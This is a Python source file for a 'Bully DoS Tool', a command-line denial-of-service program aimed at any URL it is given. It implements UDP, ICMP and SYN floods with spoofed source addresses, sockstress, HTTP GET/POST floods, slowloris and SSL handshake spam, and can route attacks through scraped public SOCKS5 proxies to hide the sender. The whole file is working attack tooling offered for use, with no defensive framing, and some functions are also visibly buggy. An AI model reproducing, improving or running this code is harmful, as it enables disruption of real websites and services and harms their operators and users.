
#---------------------------------------------------------------------------------------------------------------                          
#                            ██████╗ ██╗   ██╗██╗     ██╗  ██╗   ██╗
#                            ██╔══██╗██║   ██║██║     ██║  ╚██╗ ██╔╝
#                            ██████╔╝██║   ██║██║     ██║   ╚████╔╝ 
#                            ██╔══██╗██║   ██║██║     ██║    ╚██╔╝  
#                            ██████╔╝╚██████╔╝███████╗███████╗██║   
#                            ╚═════╝  ╚═════╝ ╚══════╝╚══════╝╚═╝Bully DoS Tool by Frank Cisco   
#                                                                Version = 1.1
#                                                                Recommended OS = Linux 
#---------------------------------------------------------------------------------------------------------------

import socket
import random
import ssl
import requests
import sys
import threading
import socks 
import os 
import string
from fake_headers import Headers
from urllib.parse import urlparse
from fake_useragent import UserAgent
from impacket import ImpactDecoder, ImpactPacket


RED,WHITE,GREEN,END =  '\033[1;91m', '\33[1;97m','\033[1;32m', '\033[0m'


class Proxy :    
   
    @staticmethod
    def get() : 
    
        proxy_list = []
        
        try :   
            folder_path = os.getcwd() + "" # Enter your folder path 
            
            files = os.listdir(folder_path)
            
            filename = "sock5.txt"

            if  filename not in files:    
                    
                req = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all').text
                
                with open('sock5.txt','w',encoding='utf-8') as file :
                    
                    file.write(req)
                    
                    file.close()  
                    
                    print(GREEN + 'File Created ..'+END)
                    
            try: 
                
                os.chdir(folder_path)
                
            except :
                
                pass
            
            with open('sock5.txt','r',encoding='utf-8') as file : 
                    
                proxies  = file.readlines()       

                for proxy in proxies : 
                        
                    proxy_list.append(proxy)  
                
            print(GREEN +'Trying to find alive proxy server...'+ END)
        
            while True : 
                
                proxy = random.choice(proxy_list)
            
                if Proxy.control(proxy) :
                        
                    print(GREEN + f'''\rOpen Sock5 Proxy Found =>
                          \rAddress=>{proxy.split(':')[0]}
                          \rPort=>{proxy.split(':')[1]} '''+ END)
                
                    return proxy
                
        except FileNotFoundError : 
            
            print(RED + f'Check the current path. Your current path is {os.getcwd()}' + END)

    @staticmethod
    def control(proxy_addr : str ) :
    
        print(GREEN + f'Proxy selected, starting to check...'+ END)
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        s.settimeout(4)
                
        try : 
            s.connect((proxy_addr.split(':')[0],int(proxy_addr.split(':')[1])))    
            
            s.sendall(b"\x05\x01\x00") # Trying to 'No Authentication Required' proxy.

            data = s.recv(2)

            s.close()

            
            return True

        except socket.error:
        
            print(RED + 'Proxy failed, another proxy is selected' + END)
            
            return False

class Target:

    @staticmethod
    def hostname() -> str :
        
        return urlparse(sys.argv[1]).hostname 
   
    @staticmethod
    def port() -> int : 
    
        if urlparse(sys.argv[1]).scheme.lower() == 'https' : 
            
            return 443 
        
        elif urlparse(sys.argv[1]).scheme.lower() == 'http' :
        
            return 80
        
        else : 
            print(RED + 'Check url '+ END)
            
            sys.exit(1)
    
    @staticmethod
    def socket_count() -> int : 
        
        return 30 
    
        
    @staticmethod
    def spoof_ip() : 
        
        addr_parse = [0, 0, 0, 0] 
    
        addr_parse[0] = str(random.randint(1,197)) 
        addr_parse[1] = str(random.randint(0,255)) 
        addr_parse[2] = str(random.randint(0,255))
        addr_parse[3] = str(random.randint(1,254))
        
        return '.'.join(addr_parse)
    
    
    @staticmethod
    def cfg() : 
        
        print(RED +f''' 
Host Name  => {Target.hostname()}

Ip Address => {socket.gethostbyname(Target.hostname())}

Attack Port => {Target.port()}

Socket Count => {Target.socket_count()}

Spoof IP = >  {Target.spoof_ip()}  
    ''' +END)



class Payload_Generator : 
    
    @staticmethod
    def udp() -> str : 
        
        return random._urandom(32)
    @staticmethod
    def bomb() -> str :
        
        return random._urandom(65000)
    @staticmethod
    def flood() -> str :
        
        return random._urandom(64) 
   
    @staticmethod
    def customL4() -> str : 
        
        size = int(input(GREEN + 'Payload Size  :\n=>')+ END)
        
    @staticmethod
    def syn(spoof_ip,target,port) -> str :  
        
        ip = ImpactPacket.IP()
        
        ip.set_ip_src(spoof_ip)
        
        ip.set_ip_dst(target)

        tcp = ImpactPacket.TCP()
                    
        tcp.set_SYN()
                
        tcp.set_th_flags(0x02)
    
        tcp.set_th_dport(port)
        
        tcp.set_th_sport(80)
        
        ip.contains(tcp)
        
        return ip.get_packet()
    
    
    @staticmethod
    def ack(spoof_ip,target,port) -> str  :
        
        ip = ImpactPacket.IP()
        
        ip.set_ip_src(spoof_ip)
        
        ip.set_ip_dst(target)

        tcp = ImpactPacket.TCP()
                    
        tcp.set_ACK()
        
        tcp.set_th_flags(0x10)

        tcp.set_th_win(0)
    
        tcp.set_th_dport(port)
        
        tcp.set_th_sport(80)
        
        ip.contains(tcp)
        
        return ip.get_packet()
    
    
    @staticmethod
    def useragent() -> str : 
        
        return UserAgent().random 
    
    @staticmethod
    def referers() -> str  :
        referers = [
               "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                ",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer",
                "/sharer.php?u=",
                ",https://drive.google.com/viewerng/viewer?url=",
                ",https://www.google.com/translate?u=",
                "https://www.google.com/",
                "http://www.yandex.com/",]
       
        return  random.choice(referers)
    
    @staticmethod
    def generate_cookie() -> str :

        cookie_chars = string.ascii_letters + string.digits

        return ''.join(random.choice(cookie_chars) for i in range(64))
    
    @staticmethod
    def generate_random_path() -> str:
    
        path_length = random.randint(1, 10) 
    
        path_chars = string.ascii_letters + string.digits + '/_-' 
        
        path = ''.join(random.choice(path_chars) for i in range(path_length)) #
    
        return '/' + path 
    
    @staticmethod
    def pps(target) -> str : 
        
        return f'GET / HTTP/1.1\r\nHost:{urlparse(target).hostname}\r\nConnection:keep-alive\r\n\r\n'
    
    @staticmethod
    def get(target) -> str : 
        
        packet = f'''
            GET / HTTP/1.1
            Host: {urlparse(target).hostname}
            User-Agent: {Payload_Generator.useragent()}
            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
            Accept-Language: en-US,en;q=0.5
            Accept-Encoding: gzip, deflate
            Content-Type: application/json; charset=UTF-8
            Referer: {Payload_Generator.referers()}
            Connection: keep-alive
            Upgrade-Insecure-Requests: 1
            '''
        return packet 
    
    @staticmethod
    def slowloris(target) :
        
        packet = f'X-a:{random.randint(1, 4000)} Host :{urlparse(target).hostname} \r\n'
        
        return packet 
    
    @staticmethod
    def post(target) -> str  : 
        
        packet =    f'''
                    POST /{Payload_Generator.generate_random_path()}?format=json&hasfast=true&authuser=0 HTTP/2
                    Host: {urlparse(target).hostname}
                    Content-Length: {random.randint(0,500)}
                    Content-Type: application/x-www-form-urlencoded;charset=UTF-8
                    X-Goog-Authuser: 0
                    Connection: keep-alive
                    User-Agent: {Payload_Generator.useragent()}
                    Accept: */*
                    X-Client-Data: CIfbygE=
                    Sec-Fetch-Site: same-site
                    Referer :{Payload_Generator.referers()}
                    Sec-Fetch-Mode: cors
                    Sec-Fetch-Dest: empty
                    Accept-Language: en-US,en;q=0.5
                    Accept-Encoding: gzip, deflate
                        [
                            [
                                1,
                                null
                                ,null
                                ,null
                                ,null
                                ,null
                                ,null
                                ,null
                                ,null
                                ,null
                                ,
                                    [
                                    null
                                    ,null
                                    ,null
                                    ,null
                                    ,"en"
                                    ,null
                                    ,null
                                    ,null
                                    ,null,]
                                            ]'''
                                            
        return packet

    @staticmethod
    def XML(target) -> str :
        
        packet = f'''
        GET /files/???XML HTTP/2
        Host: {urlparse(target).hostname}
        Cookie: {Payload_Generator.generate_cookie()}
        X-Requested-With: XMLHttpRequest
        User-Agent: {Payload_Generator.useragent()}
        Sec-Ch-Ua-Platform: "Windows"
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
        Sec-Fetch-Site: same-origin
        Sec-Fetch-Mode: no-cors
        Sec-Fetch-Dest: image
        Referer: {Payload_Generator.referers()}
        Accept-Language: en-US,en;q=0.5
        Accept-Encoding: gzip, deflate
        '''

        return packet


class Layer4 : 
    
    
    def __init__(self,proxy) :
        
        self.target = Target.hostname()
        
        self.port = Target.port()
        
        self.socket_count = Target.socket_count()
        
        self.spoof_ip = Target.spoof_ip()
        
        self.socket_list  = []    
        
        self.proxy = proxy 
        
        
        if  self.proxy : 
                    
            proxy_addr = Proxy.get()
                
            proxy_host =  proxy_addr.split(':')[0]
                
            proxy_port = int(proxy_addr.split(':')[1])
                
            socks.setdefaultproxy(socks.SOCKS5, proxy_host, proxy_port)
            
            socket.socket = socks.socksocket


    def init_udp_socket(self) : 
        
        sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM) 

        return sock 
    
    
    def udp_storm(self) : 
        
        print(GREEN + '[I]UDP STROM STARTED' + END )
        
        _payload = Payload_Generator.udp()
        
        for num in range(self.socket_count):
            
            sock = self.init_udp_socket() 
            
            print(GREEN +  f'Socket {num} created' + END)
            
            self.socket_list.append(sock)
            
        if self.socket_list : 
            
            print(RED +f'[I] Attack Started...'+END)
            
            while True : 
                
                for sock in self.socket_list:
                    
                    sock.sendto(_payload,(self.target,self.port))
                
        else : 
            print(RED +' There is no open socket' + END)

            return None 
        

    def init_icmp_socket(self) :
        
        try  :
            
            sock = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_ICMP)
            
            return sock
        
        except PermissionError : 
          
            print(RED + 'Try run as admin'+ END )
    


    def icmp_flood(self) : 
        
        select = int(input('Choose flood type Bomb or default flood => (1/2)\n1=>Bomb\n2=>Default Flood\n=>'))
        
        if select == 1  :
            
            _payload  = Payload_Generator.bomb()
            
        elif select == 2 :
            
            _payload = Payload_Generator.flood()
            
        else : 
            
            print(RED + 'WARNING 1/2 ONLY ' + END)
            
            raise ValueError
                     
        for num in range(self.socket_count):
            
            sock = self.init_icmp_socket() 
            
            print(GREEN +  f'Socket {num} created' + END)
            
            self.socket_list.append(sock)
            
        if self.socket_list : 
            
            print(RED +f'[I] Attack Started...'+END)
            
            while True : 
                
                for sock in self.socket_list:
                    
                    sock.sendto(_payload,(self.target,self.port))
                
        else : 
            print(RED +' There is no open socket' + END)

            return None 
        
        
    def init_tcp_socket(self) : 
        
        sock = socket.socket(socket.AF_INET,socket.SOCK_RAW,socket.IPPROTO_TCP) 
    
        sock.setsockopt(socket.IPPROTO_IP,socket.IP_HDRINCL,1) 
            
        sock.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)

        return sock 
    


    def syn_flood(self) :   

        print(GREEN + '[I] Syn flood started' + END )
        
        _payload = Payload_Generator.syn(self.spoof_ip,self.target,self.port)
        
        for num in range(self.socket_count) :
           
            try : 
                
                sock = self.init_tcp_socket()
                
                sock.connect((self.target,self.port))
                
                print(GREEN +  f'Socket {num} created and connected ' + END)
                
                self.socket_list.append(sock)
            
            except ConnectionError : 
                
                print(RED +  f'Socket {num} connection failure ' + END)

                pass
            
            except PermissionError : 
                
                print(RED +  f'Socket {num} failure,try run as admin ' + END)

                pass 
        
            
        if self.socket_list : 
    
            print(RED +f'[I] Attack Started...'+END)
            
            while True : 
                
                for sock in self.socket_list :
                    
                    sock.sendall(str.encode(_payload))

    def sockstress(self) : 

        print(GREEN + '[I] Sockstress started' + END )
        
        _payload0 = Payload_Generator.syn(self.spoof_ip,self.target,self.port)
        
        _payload1 = Payload_Generator.ack(self.spoof_ip,self.target,self.port)
        
        for num in range(self.socket_count) :
           
            try : 
                
                sock = self.init_tcp_socket()
                
                sock.connect((self.target,self.port))
                
                print(GREEN +  f'Socket {num} created and connected ' + END)
                
                self.socket_list.append(sock)
            
            except ConnectionError : 
                
                print(RED +  f'Socket {num} connection failure ' + END)

                pass
            
            except PermissionError : 
                
                print(RED +  f'Socket {num} failure,try run as admin ' + END)

                pass 
        
            
        if self.socket_list : 
    
            print(RED +f'[I] Attack Started...'+END)
            
            while True : 
                
                for sock in self.socket_list :
                    
                    sock.sendall(str.encode(_payload0))

                    sock.sendall(str.encode(_payload1))
    
    def run(self) : 
        select = int(input(WHITE +'''
            \r------------Select Flood Type-------------
            \r1 => UDP STORM 

            \r2 => ICMP FLOOD 

            \r3 => SYN FLOOD 

            \r4 => Sockstress
            \r------------------------------------------ 
            ''' + END ))

        if select == 1 : 
            
            self.udp_storm()
        
        elif select == 2 :
            
            self.icmp_flood()
            
        elif select == 3 :
            
            self.syn_flood()
            
        elif select == 4 : 
            
            self.sockstress() 
            
        else : 
            
            print(RED + '1/2/3/4 ONLY '+ END)
            
            raise ValueError       
        
        
class Layer7 : 
    
    
    def __init__(self,proxy) : 
        
        self.target = Target.hostname()
        
        self.port = Target.port()
        
        self.socket_count = Target.socket_count()
        
        self.socket_list  = []    

        self.proxy = proxy
        
        
        if self.proxy  : 
                    
            proxy_addr = Proxy.get()
                
            proxy_host =  proxy_addr.split(':')[0]
                
            proxy_port = int(proxy_addr.split(':')[1])
                
            socks.setdefaultproxy(socks.SOCKS5, proxy_host, proxy_port)
            
            socket.socket = socks.socksocket
        
    
    def init_tcp_socket(self) -> socket :
        
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM) 
        
        sock.setsockopt(socket.IPPROTO_TCP,socket.TCP_NODELAY,1)
        
        sock.connect((self.target,self.port))  

        if self.port == 443 :
                      
            context = ssl.create_default_context()

            context.check_hostname = False
                    
            context.verify_mode = ssl.CERT_NONE
                    
            sock = context.wrap_socket(sock,server_hostname=self.target,server_side=False,do_handshake_on_connect=True)

            return sock

        return sock
    
    def init_ssl_socket(self) -> socket : 
        
        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)

        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)             
        
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)   
        
        context.verify_mode = ssl.CERT_REQUIRED
    
        context.check_hostname = True

        sock = context.wrap_socket(sock,server_hostname=self.target,server_side=False,do_handshake_on_connect=True)

        return sock

                    
    def handshake_spam(self) :
        
        print(RED +f'[I] SSL Handshake spam preparing to attack...' + END)

        loop = 1 
    
        while True : 
            
            sockets = []
            
            print(GREEN + f'[I]Handshake spam started\nLoop => {loop}' + END)
            
            for num in range(self.socket_count) :
                
                sock = self.init_ssl_socket()  

                sockets.append(sock)

            print(RED + f'[I]Connections closing and sockets recreating\nLoop => {loop}' + END)
        
            for sock in self.socket_list  : 
                
                sock.do_handshake()
                
                sock.close()
            
            loop +=1 

    def run(self) :
        
        select = int(input(WHITE +''' 
                \r-----------Select Flood Type ---------

                \r1 => HTTP GET 

                \r2 => HTTP PPS 

                \r3 => HTTP POST 

                \r4 => XMLRPC   

                \r5 => Slowloris     

                \r6 => SSL DoS (Handshake Spam)  
                \r--------------------------------------\n=>
                '''+ END ))

        if select == 1 : 
           
            _payload = Payload_Generator.get(self.target)

        elif select == 2 : 
            
            _payload = Payload_Generator.pps(self.target)
        
        elif select ==  3 : 
            
            _payload = Payload_Generator.post(self.target)
            
        elif select == 4 :
            
            _payload = Payload_Generator.XML(self.target)
        
        elif select == 5  : 
            
            _payload = Payload_Generator.slowloris(self.target)
        
        elif select == 6 :
            
            self.handshake_spam()

            return None 
        
        else : 
            
            print(RED +'1/2/3/4 Only ' + END )
            
            raise ValueError 
            
        for num in range(self.socket_count) : 
            
            sock = self.init_tcp_socket()
            
            print(GREEN +  f'Socket {num} created and connected ' + END)
           
            self.socket_list.append(sock)
        
        if self.socket_list : 
            
            print(RED+ '[I] Attack Starting..... '+END)
        
            while True : 
                    
                for sock in self.socket_list :

                    sock.sendall(str.encode(_payload)) 
       
def main() : 
    
    Target.cfg()
    
    proxy = int(input( RED +'Connect proxy 1 or 0\n===>' + END) )
    
    l4 = Layer4(proxy)
   
    l7 = Layer7(proxy)
    
    print(WHITE +'-----------------------------------------' + END) 
    
    layer = int(input(WHITE+ 'Attack Layer ==>\n=>4\n=>7\n===>>>'+ END))
    
    if layer == 4 : 
        
        l4.run()
        
    elif layer == 7: 
        
        l7.run()

    else : 
        
        print(RED + '4 or 7' + END)
        
        raise ValueError 
        
if __name__ == '__main__': 
    
    main()
            
        
    
